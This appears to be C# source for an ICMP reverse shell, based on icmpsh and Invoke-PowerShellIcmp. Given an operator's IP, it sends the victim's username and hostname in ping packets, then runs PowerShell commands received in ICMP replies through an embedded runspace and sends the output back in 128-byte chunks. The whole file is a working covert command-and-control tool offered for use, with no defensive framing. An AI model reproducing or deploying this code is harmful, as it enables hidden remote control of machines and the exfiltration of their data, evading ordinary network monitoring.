using System;
using System.IO;
using System.Text;
using System.Net.NetworkInformation;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Threading;
using System.Collections.ObjectModel;

// Based in @3xocyte workaround / Invoke-PowerShellIcmp.ps1 / icmpsh_m.py

namespace simple_icmp_shell
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("IP is required [!]");
                Environment.Exit(1);
            }
            string who = args[0];
            int bufferSize = 128;
            // Establecemos la conexion
            Ping icmpClient = new Ping();
            PingOptions pingOpts = new PingOptions();
            pingOpts.DontFragment = true;
            string connectString = ("Running as " + Environment.GetEnvironmentVariable("username") + " on " + Environment.GetEnvironmentVariable("computername"));
            byte[] connectBytes = Encoding.ASCII.GetBytes(connectString);
            icmpClient.Send(who, 60 * 1000, connectBytes, pingOpts);

            // Muestra el CMD
            string promptString = ("\nPS " + Directory.GetCurrentDirectory() + "> ");
            byte[] promptBytes = Encoding.ASCII.GetBytes(promptString);
            icmpClient.Send(who, 60 * 1000, promptBytes, pingOpts);

            while (true)
            {
                string sendString = "";
                byte[] sendBytes = Encoding.ASCII.GetBytes(sendString);
                PingReply reply = icmpClient.Send(who, 60 * 1000, sendBytes, pingOpts);

                if (reply.Buffer.Length > 0)
                {
                    string response = Encoding.ASCII.GetString(reply.Buffer);
                    string result = Pshell.RunPSCommand(response);
                    byte[] returnBytes = Encoding.ASCII.GetBytes(result);

                    decimal index = Math.Floor((decimal)returnBytes.Length / bufferSize);
                    int i = 0;
                    // Divide la salida del output en pequeños buffers
                    if (returnBytes.Length > bufferSize)
                    {
                        while (i < index)
                        {
                            byte[] byteChunk = new byte[bufferSize];
                            Array.Copy(returnBytes, i * bufferSize, byteChunk, 0, bufferSize);
                            icmpClient.Send(who, 60 * 10000, byteChunk, pingOpts);
                            i++;
                        }
                        int remainingIndex = returnBytes.Length % bufferSize;
                        if (remainingIndex != 0)
                        {
                            byte[] byteChunk = new byte[remainingIndex];
                            Array.Copy(returnBytes, i * bufferSize, byteChunk, 0, remainingIndex);
                            icmpClient.Send(who, 60 * 10000, byteChunk, pingOpts);
                        }
                    }
                    else
                    {
                        icmpClient.Send(who, 60 * 10000, returnBytes, pingOpts);
                    }
                    icmpClient.Send(who, 60 * 1000, promptBytes, pingOpts);
                }
                else
                {
                    Thread.Sleep(2000);
                }
            }
        }

        // ORIGINAL: this code shows up in a bunch of Casey Smith's scripts (MSBuild AppLocker bypass, etc), available on various backups
        // Requires adding ref to System.Management.Automation.dll
        public class Pshell
        {
            public static string RunPSCommand(string cmd)
            {
                try
                {
                    //Init stuff
                    Runspace runspace = RunspaceFactory.CreateRunspace();
                    runspace.Open();
                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
                    Pipeline pipeline = runspace.CreatePipeline();

                    //Add commands
                    pipeline.Commands.AddScript(cmd);

                    //Prep PS for string output and invoke
                    pipeline.Commands.Add("Out-String");
                    Collection<PSObject> results = pipeline.Invoke();
                    runspace.Close();

                    //Convert records to strings
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (PSObject obj in results)
                    {
                        stringBuilder.Append(obj);
                    }
                    return stringBuilder.ToString().Trim();
                }
                catch
                {
                    string fail = "Failed";
                    return fail;
                }
            }

        }
    }
}
